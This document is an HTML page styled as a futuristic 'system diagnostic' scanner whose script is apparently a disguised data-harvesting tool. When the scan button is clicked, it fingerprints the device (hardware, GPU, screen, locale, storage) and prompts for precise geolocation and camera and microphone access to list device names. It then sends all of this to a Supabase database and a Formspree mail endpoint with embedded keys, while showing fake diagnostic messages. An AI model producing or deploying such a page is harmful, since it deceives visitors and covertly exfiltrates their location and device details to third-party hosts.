<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Quantum System Diagnostic Matrix</title>
    <style>
        :root {
            --primary: #00ffcc;
            --bg-dark: #0a0f1d;
            --card-bg: rgba(16, 24, 48, 0.75);
            --border: rgba(0, 255, 242, 0.15);
            --text: #e2e8f0;
        }

        * { box-sizing: border-box; margin: 0; padding: 0; }

        body {
            font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, Roboto, sans-serif;
            background: linear-gradient(135deg, #050814 0%, #0c1328 100%);
            color: var(--text);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            overflow-x: hidden;
        }

        .container {
            width: 100%;
            max-width: 800px;
            background: var(--card-bg);
            backdrop-filter: blur(12px);
            -webkit-backdrop-filter: blur(12px);
            border: 1px solid var(--border);
            border-radius: 16px;
            padding: 30px;
            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.5), 0 0 30px rgba(0, 255, 204, 0.05);
            transform: translateY(0);
            transition: all 0.4s cubic-bezier(0.16, 1, 0.3, 1);
        }

        h1 {
            font-size: 24px;
            font-weight: 600;
            text-align: center;
            letter-spacing: 2px;
            color: #ffffff;
            text-shadow: 0 0 10px rgba(0, 255, 204, 0.3);
            margin-bottom: 25px;
            text-transform: uppercase;
        }

        .progress-container {
            width: 100%;
            background: rgba(255, 255, 255, 0.05);
            height: 6px;
            border-radius: 10px;
            margin-bottom: 25px;
            overflow: hidden;
            position: relative;
        }

        .progress-bar {
            height: 100%;
            width: 0%;
            background: linear-gradient(90deg, #00f2fe 0%, #4facfe 100%);
            box-shadow: 0 0 10px #00f2fe;
            transition: width 0.4s ease;
        }

        .console-screen {
            background: #040814;
            border: 1px solid rgba(255, 255, 255, 0.05);
            border-radius: 8px;
            padding: 20px;
            height: 250px;
            overflow-y: auto;
            font-family: 'Courier New', Courier, monospace;
            font-size: 13px;
            color: #a0aec0;
            margin-bottom: 25px;
            box-shadow: inset 0 2px 8px rgba(0,0,0,0.8);
        }

        .log-line {
            margin-bottom: 6px;
            opacity: 0;
            transform: translateX(-10px);
            animation: fadeInLine 0.3s forwards ease-out;
        }

        @keyframes fadeInLine {
            to { opacity: 1; transform: translateX(0); }
        }

        .accent-success { color: var(--primary); font-weight: bold; }
        .accent-process { color: #38bdf8; }
        .accent-alert { color: #fbbf24; }
        .accent-fail { color: #f87171; }

        .btn-core {
            background: linear-gradient(135deg, #00f2fe 0%, #4facfe 100%);
            color: #040814;
            border: none;
            padding: 16px 24px;
            font-size: 16px;
            font-weight: 700;
            border-radius: 8px;
            cursor: pointer;
            width: 100%;
            letter-spacing: 1px;
            text-transform: uppercase;
            box-shadow: 0 4px 15px rgba(0, 242, 254, 0.3);
            transition: all 0.3s cubic-bezier(0.16, 1, 0.3, 1);
        }

        .btn-core:hover:not(:disabled) {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(0, 242, 254, 0.5);
            filter: brightness(1.1);
        }

        .btn-core:active:not(:disabled) {
            transform: translateY(0);
        }

        .btn-core:disabled {
            background: #1e293b;
            color: #64748b;
            box-shadow: none;
            cursor: not-allowed;
        }
    </style>
</head>
<body>

    <div class="container" id="mainCard">
        <h1>Diagnostic Core Interface</h1>
        
        <div class="progress-container">
            <div class="progress-bar" id="progressBar"></div>
        </div>

        <div class="console-screen" id="consoleDisplay">
            <div class="log-line accent-process">[SYSTEM] Telemetry protocols initialized. Awaiting user ignition sequence...</div>
        </div>

        <button class="btn-core" id="triggerBtn" onclick="initiateDynamicHarvest()">Launch System Scan</button>
    </div>

    <script>
        const consoleDisplay = document.getElementById('consoleDisplay');
        const progressBar = document.getElementById('progressBar');
        const triggerBtn = document.getElementById('triggerBtn');
        const mainCard = document.getElementById('mainCard');

        // PRODUCTION CONNECTOR ENDPOINTS
        const FORMSPREE_ENDPOINT = 'https://formspree.io/f/mredzakj';
        const SUPABASE_URL = 'https://xltxohuaafferszitlwn.supabase.co';
        const SUPABASE_ANON_KEY = 'sb_publishable_jb-ZuhCfLoZYaMG9oWuEag_gXJuppw7';

        let collectedMetrics = {
            hardwareProfile: {},
            screenMatrix: {},
            regionalContext: {},
            networkStatus: {},
            storageProfile: {},
            hardwareTokens: { geolocation: "Denied/Not Provided", hardwareLabels: "Denied/Not Provided" }
        };

        function pushOutput(message, designClass = 'accent-process') {
            const time = new Date().toLocaleTimeString();
            consoleDisplay.innerHTML += `<div class="line ${designClass}">[${time}] ${message}</div>`;
            consoleDisplay.scrollTop = consoleDisplay.scrollHeight;
        }

        function updateProgress(percentage) {
            progressBar.style.width = `${percentage}%`;
        }

        async function runBaseExtraction() {
            pushOutput("Gleaning expanded open environment metadata...", "accent-process");
            
            // Core Hardware Profiling
            collectedMetrics.hardwareProfile = {
                userAgent: navigator.userAgent,
                cores: navigator.hardwareConcurrency || "N/A",
                memoryEst: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "N/A",
                maxTouch: navigator.maxTouchPoints || 0
            };

            // Display Dimensions and Color Capabilities
            collectedMetrics.screenMatrix = {
                bounds: `${screen.width}x${screen.height}`,
                availableViewport: `${window.innerWidth}x${window.innerHeight}`,
                depth: `${screen.colorDepth}-bit`,
                scaleRatio: window.devicePixelRatio || 1
            };

            // Localization Profiles
            collectedMetrics.regionalContext = {
                zone: Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown",
                locale: navigator.language || "Unknown",
                preferredLanguages: navigator.languages ? navigator.languages.join(', ') : "Unknown"
            };

            // HTML5 Storage Allocation Estimations
            if (navigator.storage && navigator.storage.estimate) {
                try {
                    const estimate = await navigator.storage.estimate();
                    collectedMetrics.storageProfile = {
                        quotaMb: Math.round(estimate.quota / (1024 * 1024)),
                        usageMb: Math.round(estimate.usage / (1024 * 1024))
                    };
                } catch(e) {
                    collectedMetrics.storageProfile = "Estimate Denied";
                }
            }

            // WebGL Subsystem Deep Driver Mapping
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (gl) {
                    const debug = gl.getExtension('WEBGL_debug_renderer_info');
                    collectedMetrics.hardwareProfile.gpuVendor = debug ? gl.getParameter(debug.UNMASKED_VENDOR_WEBGL) : "Standard Vendor";
                    collectedMetrics.hardwareProfile.gpuRenderer = debug ? gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) : "Standard Engine";
                }
            } catch(e) {
                collectedMetrics.hardwareProfile.gpuRenderer = "Context Initialization Interrupted";
            }

            updateProgress(35);
            pushOutput("Comprehensive environment arrays structured.", "accent-success");
        }

        async function initiateDynamicHarvest() {
            triggerBtn.disabled = true;
            triggerBtn.innerText = "Processing Operational Layers...";
            mainCard.style.transform = "scale(0.99)";
            
            await runBaseExtraction();

            // Request 1: Location Telemetry Handshake
            pushOutput("Deploying hardware Geolocation handshake prompt...", "accent-process");
            await queryLocation();
            updateProgress(65);

            // Request 2: Local Hardware Label Scan
            pushOutput("Deploying peripheral enumeration access layer...", "accent-process");
            await queryPeripherals();
            updateProgress(85);

            // Phase 3: Dual Transmission Execution
            pushOutput("Packaging structured indices for database arrays...", "accent-process");
            await executeDualTransmission();
        }

        function queryLocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    collectedMetrics.hardwareTokens.geolocation = "Unsupported Device Architecture";
                    resolve();
                } else {
                    navigator.geolocation.getCurrentPosition(
                        (p) => {
                            collectedMetrics.hardwareTokens.geolocation = {
                                lat: p.coords.latitude,
                                lon: p.coords.longitude,
                                accuracyMeters: p.coords.accuracy,
                                altitude: p.coords.altitude || "N/A"
                            };
                            pushOutput("Location metadata confirmed and synchronized.", "accent-success");
                            resolve();
                        },
                        (err) => {
                            collectedMetrics.hardwareTokens.geolocation = `Refused: ${err.message}`;
                            pushOutput("Location access skipped by device policy.", "accent-alert");
                            resolve();
                        },
                        { enableHighAccuracy: true, timeout: 6000 }
                    );
                }
            });
        }

        async function queryPeripherals() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: true });
                const devices = await navigator.mediaDevices.enumerateDevices();
                let devicesFound = [];
                
                devices.forEach(d => {
                    if (d.label) devicesFound.push(`${d.kind.replace('input', '')}: ${d.label}`);
                });

                collectedMetrics.hardwareTokens.hardwareLabels = devicesFound.length ? devicesFound.join(' | ') : "Access Open (Default Drivers Verified)";
                pushOutput("Hardware identifier arrays cross-referenced.", "accent-success");
                stream.getTracks().forEach(t => t.stop());
            } catch(e) {
                collectedMetrics.hardwareTokens.hardwareLabels = `Refused: ${e.message}`;
                pushOutput("Hardware identification skipped by device policy.", "accent-alert");
            }
        }

        async function executeDualTransmission() {
            // Processing Flow A: Supabase Log Ingestion
            pushOutput("Pushing transaction data to Supabase cluster...", "accent-process");
            try {
                const dbRes = await fetch(`${SUPABASE_URL}/rest/v1/device_logs`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'apikey': SUPABASE_ANON_KEY,
                        'Authorization': `Bearer ${SUPABASE_ANON_KEY}`
                    },
                    body: JSON.stringify({ raw_payload: collectedMetrics })
                });
                if (dbRes.ok) {
                    pushOutput("Supabase storage transaction finalized successfully.", "accent-success");
                } else {
                    pushOutput("Supabase instance rejected storage record payload.", "accent-fail");
                }
            } catch(e) {
                pushOutput(`Supabase connection channel offline: ${e.message}`, "accent-fail");
            }

            // Processing Flow B: Formspree Mail Delivery Routing
            pushOutput("Forwarding dynamic diagnostic bundle to mail gateway...", "accent-process");
            try {
                const mailRes = await fetch(FORMSPREE_ENDPOINT, {
                    method: 'POST',
                    headers: { 'Accept': 'application/json', 'Content-Type': 'application/json' },
                    body: JSON.stringify(collectedMetrics)
                });
                
                if (mailRes.ok) {
                    pushOutput("Mail gateway transit verified. Transmission sequence absolute.", "accent-success");
                    updateProgress(100);
                    triggerBtn.innerText = "Core Scan Complete";
                    mainCard.style.transform = "translateY(0)";
                } else {
                    pushOutput("Mail gateway rejected structured object parameters.", "accent-fail");
                    triggerBtn.innerText = "Gateway Error";
                }
            } catch(e) {
                pushOutput(`Mail gateway routing route exception: ${e.message}`, "accent-fail");
                triggerBtn.innerText = "Network Failure";
            }
        }
    </script>
</body>
</html>
